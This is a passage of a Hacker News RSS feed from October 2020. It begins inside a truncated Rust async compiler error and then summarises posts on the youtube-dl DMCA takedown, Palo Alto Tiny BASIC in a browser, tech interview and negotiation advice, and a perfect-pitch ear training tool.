    = note: required because it appears within the type `for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8, 't9, 't10, 't11&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), std::option::Option&lt;pgwire::message::FrontendMessage&gt;, std::time::Instant, &amp;'t1 str, std::string::String, impl futures::Future, std::vec::Vec&lt;u32&gt;, impl futures::Future, std::vec::Vec&lt;pgrepr::format::Format&gt;, std::vec::Vec&lt;std::option::Option&lt;std::vec::Vec&lt;u8&gt;&gt;&gt;, impl futures::Future, i32, usize, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future}`
    = note: required because it appears within the type `[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::advance_ready::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt; for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8, 't9, 't10, 't11&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), std::option::Option&lt;pgwire::message::FrontendMessage&gt;, std::time::Instant, &amp;'t1 str, std::string::String, impl futures::Future, std::vec::Vec&lt;u32&gt;, impl futures::Future, std::vec::Vec&lt;pgrepr::format::Format&gt;, std::vec::Vec&lt;std::option::Option&lt;std::vec::Vec&lt;u8&gt;&gt;&gt;, impl futures::Future, i32, usize, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future}]`
    = note: required because it appears within the type `std::future::from_generator::GenFuture&lt;[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::advance_ready::#0 0:&amp;mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt; for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6, 't7, 't8, 't9, 't10, 't11&gt; {std::future::ResumeTy, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, &amp;'s mut pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, pgwire::codec::FramedConn&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), std::option::Option&lt;pgwire::message::FrontendMessage&gt;, std::time::Instant, &amp;'t1 str, std::string::String, impl futures::Future, std::vec::Vec&lt;u32&gt;, impl futures::Future, std::vec::Vec&lt;pgrepr::format::Format&gt;, std::vec::Vec&lt;std::option::Option&lt;std::vec::Vec&lt;u8&gt;&gt;&gt;, impl futures::Future, i32, usize, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future, impl futures::Future}]&gt;`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `impl futures::Future`
    = note: required because it appears within the type `for&lt;'r, 's, 't0, 't1&gt; {std::future::ResumeTy, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, i32, std::vec::Vec&lt;(std::string::String, std::string::String)&gt;, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), pgwire::protocol::State, impl futures::Future, impl futures::Future, coord::SessionClient, impl futures::Future}`
    = note: required because it appears within the type `[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::run::#0 0:pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, 1:i32, 2:std::vec::Vec&lt;(std::string::String, std::string::String)&gt; for&lt;'r, 's, 't0, 't1&gt; {std::future::ResumeTy, pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, i32, std::vec::Vec&lt;(std::string::String, std::string::String)&gt;, &amp;'r mut pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::TcpStream&gt;&gt;&gt;, impl futures::Future, (), pgwire::protocol::State, impl futures::Future, impl futures::Future, coord::SessionClient, impl futures::Future}]`
    = note: required because it appears within the type `std::future::from_generator::GenFuture&lt;[static generator@pgwire::protocol::StateMachine::&lt;A&gt;::run::#0 0:pgwire::protocol::StateMachine&lt;pgwire::server::Conn&lt;ore::netio::SniffedStream&lt;tokio::net::T…</code></pre></div></div></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://meltware.com/2020/10/21/rust-async-nonsense.html?">https://meltware.com/2020/10/21/rust-async-nonsense.html?</a></em></p>]]>
            </description>
            <link>https://meltware.com/2020/10/21/rust-async-nonsense.html?</link>
            <guid isPermaLink="false">hacker-news-small-sites-24874283</guid>
            <pubDate>Fri, 23 Oct 2020 21:16:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The YouTube-DL Takedown]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24873805">thread link</a>) | @resynth1943
<br/>
October 23, 2020 | https://resynth1943.net/articles/youtube-dl-takedown/ | <a href="https://web.archive.org/web/*/https://resynth1943.net/articles/youtube-dl-takedown/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="content">
		
		<p>GitHub has removed the ability to access youtube-dl's source code due to a DMCA.</p>

		<p>On the 23rd of October, GitHub received a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA</a> against the youtube-dl authors, claiming the software infringed copyright Laws. While I fundamentally disagree with this, let's talk more about it.</p>
<p>First off, it should go without saying that this source code needs to be held elsewhere, outside of the control of GitHub or GitLab. We've seen an increasing amount of <a href="https://github.com/github/dmca/tree/master/2020/10">Cease and Desist</a> notices being sent to GitHub, with a staggering 124 (!) in October of 2020.</p>
<p>Secondly, copyright claims such as these are harmful to genuine software development. While these claims do hold some truth, some say it is fundamentally <em>unjust</em> to prevent access to an educational source code repository.</p>
<p>In light of distributed source code hosting platforms such as Git, thousands of developers have the public domain youtube-dl source code stored <em>locally</em>, hence the claim to remove the source code is impossible.</p>
<p>Nevertheless, there are still ways to access this source code. For starters, the <code>youtube-dl</code> module is still available on <a href="https://pypi.org/project/youtube_dl/">PyPi</a>, a package hosting platform for Python. Also, <a href="https://gitee.com/mirrors/youtube-downloader">Gitee (a Chinese Git platform)</a> contains a copy of youtube-dl in its entirety.</p>
<p>I would encourage you all to create mirrors on alternative Git hosting platforms. I'm more than happy to update this article with any further information.</p>


		<!-- Doing a little experiment here. -->
		<p aria-disabled="true">resynth1943.article</p>
	</div></div>]]>
            </description>
            <link>https://resynth1943.net/articles/youtube-dl-takedown/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873805</guid>
            <pubDate>Fri, 23 Oct 2020 20:35:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Palo Alto Tiny BASIC in the Browser]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24873472">thread link</a>) | @tosh
<br/>
October 23, 2020 | http://troypress.com/palo-alto-tiny-basic-in-your-browser/ | <a href="https://web.archive.org/web/*/http://troypress.com/palo-alto-tiny-basic-in-your-browser/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
				




<p><a href="https://maly.cz/">Martin Malý</a> has adapted Version 2 of Li Chen Wang’s <a href="https://en.wikipedia.org/wiki/Tiny_BASIC#Palo_Alto_Tiny_BASIC">Palo Alto Tiny BASIC</a> to run on his <a href="https://www.asm80.com/">ASM80</a> browser-based assembler and emulator. I’ve uploaded <a href="https://github.com/Geddd/PATB4ASM80">the source code</a>, with his permission, to GitHub.</p>



<p><strong>Background</strong></p>



<p>Palo Alto Tiny BASIC emerged out of the Tiny BASIC movement started by People’s Computer Company and taken up by the Homebrew Computer Club. Fellow members Steve Wozniak and Tom Pittman would develop their own BASICs (Integer BASIC and 6800 Tiny BASIC respectively). Wang analyzed the Altair BASIC code and contributed edits to Tiny BASIC Extended. Wang published in the newsletter a loader for the 8080, commenting on the <em>Open Letter to Hobbyists:</em></p>



<blockquote><p>Altair Basic has a bootstrap loader of twenty or twenty one bytes long. In principle, you can use this bootstrap to load in your own loader which will then load in your program. However, since Mr. Bill Gates claims that he did not yet payed [sic] enough and is in the mood of calling people thieves. (See HBCC newsletter ’12-1.) I decided to code one myself. What comes out is a bootstrap of sixteen bytes long. This is still too long, maybe our professional experts can make it shorter. For the time being you are welcome to copy mine and I will not call you a thief (this includes Mr. Gates).</p></blockquote>



<p>No surprise then that Li Chen Wang made his BASIC implementation available for free. (I found this quote reading old Homebrew newsletter articles in my research for the <a href="http://troypress.com/basic-interpreters-new-wikipedia-article/" data-type="post" data-id="853">BASIC interpreter article</a>.)</p>



<p>The only smaller implementation of Tiny BASIC was <a href="http://troypress.com/the-dialects-of-tiny-basic/" data-type="post" data-id="878">MINOL</a>, which used unsigned bytes instead of signed integers and which used nonstandard commands. Also weighing in under 2kB, when a common method of shipping interpreters was 4kB ROMs, Palo Alto Tiny BASIC supported a more typical version of the language while leaving extensive room for customization for specific hardware, something which was taken advantage of multiple times, for the TRS-80, the <a href="http://troypress.com/astro-basic/" data-type="post" data-id="867">Bally Astrocade</a>, the Sharp PC-1211, and the Cromemco.</p>



<p><strong>The Code</strong></p>



<p>It’s been fun to play with the source code that was behind three of the computers I used as a kid. Some things I learnt:</p>



<ul><li>The code is very well structured and extensible. I added a few commands in under an hour (<em>PEEK, FRE()</em>). All you need to do is insert new commands in the keyword table, then adapt code elsewhere.</li><li>I was very excited to find a few small bugs in the code:<ul><li>The system famously had only three error messages (“WHAT?” for syntax errors, “HOW?” for functional errors, and “SORRY” for capacity issues). If you execute a <em>RETURN</em> with no corresponding <em>GOSUB</em> you get a &nbsp;“WHAT?” instead of a “HOW?”</li></ul><ul><li><em>10 INPUT “HELLO WORLD” </em>acts like a valid <em>PRINT</em> statement when it should cause a syntax error, since no variable is specified to receive the input.</li></ul><ul><li>The language only supports integers, but decimals aren’t ignored as they should be. <em>PRINT 1.1, 1.2</em> outputs <em>1</em> and <em>0</em>.</li></ul></li><li>There’s an Easter egg! “W”, “AN”, “G”</li></ul>



<figure><img data-attachment-id="904" data-permalink="http://troypress.com/palo-alto-tiny-basic-in-your-browser/image-5/" data-orig-file="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?fit=379%2C329" data-orig-size="379,329" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image" data-image-description="" data-medium-file="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?fit=300%2C260" data-large-file="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?fit=379%2C329" loading="lazy" width="379" height="329" src="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?resize=379%2C329" alt="" srcset="https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?w=379 379w, https://i1.wp.com/troypress.com/wp-content/uploads/2020/10/image.png?resize=300%2C260 300w" sizes="(max-width: 379px) 100vw, 379px" data-recalc-dims="1"></figure>



<p><strong>RST 1 Routine</strong></p>



<p>The RST 1 routine is a work of art, using the call stack to determine where its parameters are, with the byte after RST 1 specifying the character to match and the byte after that specifying the offset to jump to. Wang’s ability to write such memory-efficient code is why he didn’t need to implement the <a href="http://troypress.com/the-tiny-basic-interpretive-language-il-and-onions/" data-type="post" data-id="249">IL virtual machine</a>.</p>



<figure><img data-attachment-id="905" data-permalink="http://troypress.com/palo-alto-tiny-basic-in-your-browser/image-1-2/" data-orig-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?fit=407%2C60" data-orig-size="407,60" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-1" data-image-description="" data-medium-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?fit=300%2C44" data-large-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?fit=407%2C60" loading="lazy" width="407" height="60" src="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?resize=407%2C60" alt="" srcset="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?w=407 407w, https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-1.png?resize=300%2C44 300w" sizes="(max-width: 407px) 100vw, 407px" data-recalc-dims="1"></figure>



<figure><img data-attachment-id="906" data-permalink="http://troypress.com/palo-alto-tiny-basic-in-your-browser/image-2-2/" data-orig-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?fit=468%2C203" data-orig-size="468,203" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?fit=300%2C130" data-large-file="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?fit=468%2C203" loading="lazy" width="468" height="203" src="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?resize=468%2C203" alt="" srcset="https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?w=468 468w, https://i2.wp.com/troypress.com/wp-content/uploads/2020/10/image-2.png?resize=300%2C130 300w" sizes="(max-width: 468px) 100vw, 468px" data-recalc-dims="1"></figure>



<p>I encourage you to check out the <a href="https://github.com/Geddd/PATB4ASM80">source code</a> for yourself.</p>

		
		</div></div>]]>
            </description>
            <link>http://troypress.com/palo-alto-tiny-basic-in-your-browser/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873472</guid>
            <pubDate>Fri, 23 Oct 2020 20:09:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Win Interviews and Influence Offers]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24873206">thread link</a>) | @vimota
<br/>
October 23, 2020 | https://vimota.me/writing/interviews | <a href="https://web.archive.org/web/*/https://vimota.me/writing/interviews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p><em>Disclaimers: Everyone's situation is different, this is just advice from mine and my friends' experience going through the interview and negotiation process. I don't necessarily agree with the current state of technical interviewing, but this piece presumes the status quo - though there are much <a href="https://medium.com/helpful-com/https-medium-com-fnthawar-helpful-technical-interviews-are-garbage-dc5d9aee5acd">better</a> <a href="https://medium.com/@racheltho/how-to-make-tech-interviews-a-little-less-awful-c29f35431987">interviewing</a> <a href="https://about.gitlab.com/blog/2020/03/19/the-trouble-with-technical-interviews/">methods</a>. I'm no expert, there are plenty of those who you should listen to.</em></p>
<blockquote>
<p>Tldr;</p>
<ul>
<li>READ <a href="https://twitter.com/patio11">@patio11</a>'s classic <a href="https://www.kalzumeus.com/2012/01/23/salary-negotiation/">Salary Negotiation post</a>. Every one should read it and then re-read it. This covers bits of it, but assumes the reader has already gone through it, so this focuses more on tactical techniques.</li>
<li>The best leverage is another offer (always have a good <a href="https://en.wikipedia.org/wiki/Best_alternative_to_a_negotiated_agreement">BATNA</a>), or a well positioned starting place.</li>
<li>The best way to get good offers is to do well on the interviews:<ul>
<li>practice a lot, mostly for the things you'll be tested on<ul>
<li>for most engineers this means coding questions, system design questions, (sometimes) debugging code, and project review.</li>
</ul></li>
</ul></li>
<li>It's a numbers game and timing matters quite a lot.</li>
<li>Practice negotiating, all the usual tips:<ul>
<li>Don't mention numbers, get them to give you an offer (you can nudge them that you're expecting "competitive" offers given the other companies you're interviewing at)</li>
<li>Don't haggle or go back and forth too many times. Ideally you get all the initial offers, then progressively use them against each other 1-2 times at most.</li>
<li>Figure out which levers matter to you the most (equity? location? level?) and when they don't have freedom to adjust in one, try another. Be willing to give in one dimension that matters less to you in order to take in another that matters more.</li>
</ul></li>
</ul>
</blockquote>
<p>Having recently gone through the tech interview loop, and discussing it with half a dozen friends who did the same, I realized how much private knowledge there was around optimizing the whole process. The unfortunate truth is that a lot of this information can make a <code>$10k-100k+</code> difference in salary for otherwise the same engineer. Some of it is common sense, but a lot of it is learned through word of mouth or collecting various sources online. So I wanted to level the playing field and put it all in one place in the hopes this helps a few folks who perhaps have less access to this information.</p>
<p>A little bit about myself: throughout my (6) internship experiences at the University of Waterloo I went through many dozens of interviews. It served as preparation for new grad interviews where I got several offers including Shopify and Google (where I eventually signed). After four years at Google I decided to go through the process again, and eventually received four offers at all the places I had onsites with: Square, CloudKitchens, Robinhood and Stripe. I even consulted with a <a href="https://fearlesssalarynegotiation.com/coach/">negotiation coach</a> (highly recommend him if you're not excited about the prospect of doing this yourself) and was told I had done everything I could have to get the best offer. I'm by no means an expert in this whole thing, but I've gotten to see a lot about how it works and had fun trying to pick it apart, while also learning a lot from others doing the same.</p>
<p>This guide is targeted at those who already have engineering experience, or perhaps are just going through their first round of interviews, but not those still learning computer science - for that there are plenty of other <a href="https://twitter.com/RandallKanna/status/1285630730610053123?s=20">great sources</a>. Otherwise, I'm assuming that you've decided to look around for an opportunity and want to do it in the most effective way possible. I hope this guide is as tactical as possible, so I'll keep things brief and actionable.</p>

<p>In the ideal case (and I'm not quite there either, but want to be more deliberate about it) you'll naturally have made friends and acquaintances throughout the industry that will think of you when they need to hire someone. A lot of times, these sorts of referrals will bypass parts or all of the standard interview process. Even if this is the case, unless you have a really good sense of the job market and the offer ranges for your experience level, <strong>I still recommend doing a couple of other interviews before taking such an offer</strong> so you can be confident it's competitive.</p>
<p>Most people, especially starting out, will have to seek out their own opportunities and that's fine! <strong>Define a criteria</strong> for yourself of things that interest you, locations you'd be willing to relocate to (remote?), and values you care about in a company. Don't necessarily restrict yourself to these for applying since you want to <strong>cast your net as wide as possible in the beginning</strong>, but keep your criteria in mind as you get closer to making your decision. Be sure to apply to companies that you know give out very high offers, even if you're not thrilled about working there because you may be able to use their offers as leverage.</p>
<p>It might be helpful to create an <code>Inteview Tracker</code>. I used a <a href="https://www.notion.so/vimota/adc4e53c94ea4f7a92e7af271d9d6d94?v=830efb1379904a6bad53cbf6d7e453a5">Notion Kanban board</a> to keep track of the different stages I was in for each company.
<img src="https://i.imgur.com/rqz9t7M.png"></p>
<p>Once you've applied to all the companies on your list, try to reach out to people in those companies to get 1) information about the interview process and the company culture and 2) potentially fast tracked through it. If you know someone at one of these companies, reach out to them! Even if you don't, pass around a list of companies you're interested in to people you know working in tech, there's a good chance they know someone who does. Cold reach outs work too, Jake does a great job of covering how to do this in his post <a href="https://justjake.substack.com/p/a-hackers-guide-to-job-hunting">A Hacker's Guide to Job Hunting</a>, I can't recommend this approach enough. Twitter is another great place to cold reach out to people at companies you're especially interested in. Most companies will have a modified process for referrals, and there's lots you can learn about a company's internal process for evaluating candidates that will help your chances, so this step can really help.</p>

<p>The best way to get great offers is to do well on the interviews. Your performance on the interviews is more than just pass/fail. Going above expectations on them gives you and the recruiter ammunition to push on the higher end of their allowed band, so try to really invest in practicing deliberately.</p>
<p>The format of the interview should be pretty familiar to you, 90% of companies follow something like this: Phone screen (coding question) -&gt; Onsite (2-3 coding questions, 1 system design, 1 project review). Sometimes they'll have a do-on-your-own-time project based interview instead, with a shorter 1-2 hour onsite. Lots has been written on how to practice for these already so I'll just link to some of the <a href="https://twitter.com/RandallKanna/status/1285630729850953729">best resources</a> and describe my general approach. 4-6 weeks of a couple of hours after work and on weekends should be more than enough time to prepare for the phone screens and onsites.</p>
<p>If you're intimidated by the open endedness of practicing for coding questions, I recommend starting by following a guide like <a href="https://yangshun.github.io/tech-interview-handbook/best-practice-questions/">this one</a>. You don't need to do every question for every week, and the dynamic programming week could be just skimmed through (in practice these are rarely asked), but it serves as a good path to make sure you cover most types of questions and continue making progress. On top of that it's useful to spend a couple sessions on:</p>
<ul>
<li><strong>algorithms and data structures</strong>; their trade offs and use cases and time complexity. <a href="https://www.interviewcake.com/data-structures-reference">These</a> are good <a href="https://github.com/kdn251/interviews">starting points</a>.</li>
<li><strong>object oriented programming and patterns</strong></li>
<li><strong>locks, parallelism and multi-threading</strong>. It's rare to get these in coding questions, but you should have some sense of what they are and how they're used. They sometimes come up when discussing follow ups to questions or in system design interviews. I mostly just reviewed the concepts with <a href="https://www.justsoftwaresolutions.co.uk/threading/locks-mutexes-semaphores.html">this</a> post, and made sure I knew how it was done in my programming language of choice, Python.</li>
<li>quirks about your <strong>programming language</strong> of choice. This probably isn't a deal breaker, but being able to drop some niche knowledge about the programming language you're using when it comes up in an interview makes you look like you really know your stuff. For example, I make sure to mention Python's Global Interpreter Lock (GIL) when talking about parallelism. <a href="https://www.notion.so/vimota/Python-Notes-7caf363f246f40ef9095e4ee13d6bcc0">Here</a> are some notes about things particular to Python I took along my practice. This is part of the reason I choose to interview with Python, it tends to have fewer things that "experts" are expected to know (compared to say, Java, where there are a million best practices), ie. fewer gotchas.</li>
</ul>
<p>The system design questions are a whole other beast, and deserve their own practice. You may not encounter them depending on the type of role you're interviewing for, but they're common for <code>full stack</code> and <code>backend</code>. They can be intimidating at first because they tend to be so open ended and have no "right answer", but once you've gone over a few examples you'll get familiar with the template you use to answer them.</p>
<ul>
<li>Go through <a href="https://github.com/donnemartin/system-design-primer">a primer</a>, taking notes on the different components that are used. Take note of the different failure modes that each part of the system can have and solutions to them (ie. retries, redundancy, timeouts, throttling, etc).</li>
<li>Impress the interviewer by naming actual services that represent each of the abstract components you're using (ie. Load balancer -&gt; NGINX, HAProxy, ELB ; cache -&gt; redis, memcache) and mention the differences between them or whether you've ever used them. This shows you have real world experience.</li>
<li>Practice answering some! Read through some <a href="https://www.educative.io/courses/grokking-the-system-design-interview/m2yDVZnQ8lG">examples</a> to learn how to structure you answers. Youtube is a solid resource for this.</li>
<li>Consistent hashing, concurrency models, partitioning, and caching are all important topics to understand.</li>
</ul>
<p>The bulk of questions you get will be covered by these, but there's a long tail of styles of questions you could also get: refactoring, debugging an open source project, designing an API, extending an existing class. It doesn't make sense to optimize for these, but know that they exist and try to get some "real world" practice as well beyond just Leetcode questions.</p>

<p>Timing matters. Try to schedule your interviews in a way that increases the chances you'll do well on the …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vimota.me/writing/interviews">https://vimota.me/writing/interviews</a></em></p>]]>
            </description>
            <link>https://vimota.me/writing/interviews</link>
            <guid isPermaLink="false">hacker-news-small-sites-24873206</guid>
            <pubDate>Fri, 23 Oct 2020 19:50:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Perfect Pitch Ear Training]]>
            </title>
            <description>
<![CDATA[
Score 165 | Comments 141 (<a href="https://news.ycombinator.com/item?id=24872754">thread link</a>) | @sergeykish
<br/>
October 23, 2020 | http://sergeykish.com/perfect-pitch-ear-training | <a href="https://web.archive.org/web/*/http://sergeykish.com/perfect-pitch-ear-training">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>I do not perceive notes in different octaves as same, this makes <a href="https://tonedear.com/ear-training/absolute-perfect-pitch-test">Toned Ear pitch training</a> guesswork. So I've created a tool where one can select individual notes:<br></p><table id="available"><tbody><tr><th>Bâ™¯/C</th><td><label for="C3">3</label></td><td><label for="C4">4</label></td><td><label for="C5">5</label></td></tr><tr><th>Câ™¯/Dâ™­</th><td><label for="C#3">3</label></td><td><label for="C#4">4</label></td><td><label for="C#5">5</label></td></tr><tr><th>D</th><td><label for="D3">3</label></td><td><label for="D4">4</label></td><td><label for="D5">5</label></td></tr><tr><th>Dâ™¯/Eâ™­</th><td><label for="D#3">3</label></td><td><label for="D#4">4</label></td><td><label for="D#5">5</label></td></tr><tr><th>E/Fâ™­</th><td><label for="E3">3</label></td><td><label for="E4">4</label></td><td><label for="E5">5</label></td></tr><tr><th>F</th><td><label for="F3">3</label></td><td><label for="F4">4</label></td><td><label for="F5">5</label></td></tr><tr><th>Fâ™¯/Gâ™­</th><td><label for="F#3">3</label></td><td><label for="F#4">4</label></td><td><label for="F#5">5</label></td></tr><tr><th>G</th><td><label for="G3">3</label></td><td><label for="G4">4</label></td><td><label for="G5">5</label></td></tr><tr><th>Gâ™¯/Aâ™­</th><td><label for="G#3">3</label></td><td><label for="G#4">4</label></td><td><label for="G#5">5</label></td></tr><tr><th>A</th><td><label for="A3">3</label></td><td><label for="A4">4</label></td><td><label for="A5">5</label></td></tr><tr><th>Aâ™¯/Bâ™­</th><td><label for="A#3">3</label></td><td><label for="A#4">4</label></td><td><label for="A#5">5</label></td></tr><tr><th>B/Câ™­</th><td><label for="B3">3</label></td><td><label for="B4">4</label></td><td><label for="B5">5</label></td>
</tr></tbody></table><p>Now run , it randomly selects note and plays it. Select answer <span id="answers">, , , , , , , , , , , </span>, if wrong it plays note second time so you can make another try. Or you can  selected note again.</p><p>Correct answer increases counter <span id="counterLabel">0</span>, incorrect resets it to zero. Buttons has keyboard shortcuts, corresponding key marked by underline. For example type <span>t</span> to run "<u>T</u>est",  <span>c</span> to answer "<u>C</u>", <kbd>Shift</kbd><span>+</span><kbd>c</kbd> for "<u>Câ™¯</u>" and <kbd>Alt</kbd><span>+</span><kbd>c</kbd> for "<u>Câ™­</u>" (not sure how it would work in Safari).</p><p>I think the way to go is making strong connections between sound and its name. Knowing not guessing. I've started with just two notes â€” G3 and C4. I close my eyes and go through hundreds of tests. Once I felt confident I've added G4, than C5.</p><p>TODO:</p><ul><li>store configuration in URL hash<br></li><li>select instrument</li><li>store instruments on server</li></ul><p>UPDATES:</p><ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/AudioContext">window.webkitAudioContext</a> for Safari</li><li>buttons to answer sharps and flats</li><li>mark incorrect answer with color</li><li><code>accesskey</code> replaced by <code>document.onkeydown</code></li></ul><p>Implementation:</p> </div>]]>
            </description>
            <link>http://sergeykish.com/perfect-pitch-ear-training</link>
            <guid isPermaLink="false">hacker-news-small-sites-24872754</guid>
            <pubDate>Fri, 23 Oct 2020 19:08:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The 'education bubble' is not merely a financial crisis; it is a moral crisis]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 20 (<a href="https://news.ycombinator.com/item?id=24872331">thread link</a>) | @lawschool333
<br/>
October 23, 2020 | https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88 | <a href="https://web.archive.org/web/*/https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.pairagraph.com/dialogue/a4ddd0eddd034bc7aacc32af36bf4c88</link>
            <guid isPermaLink="false">hacker-news-small-sites-24872331</guid>
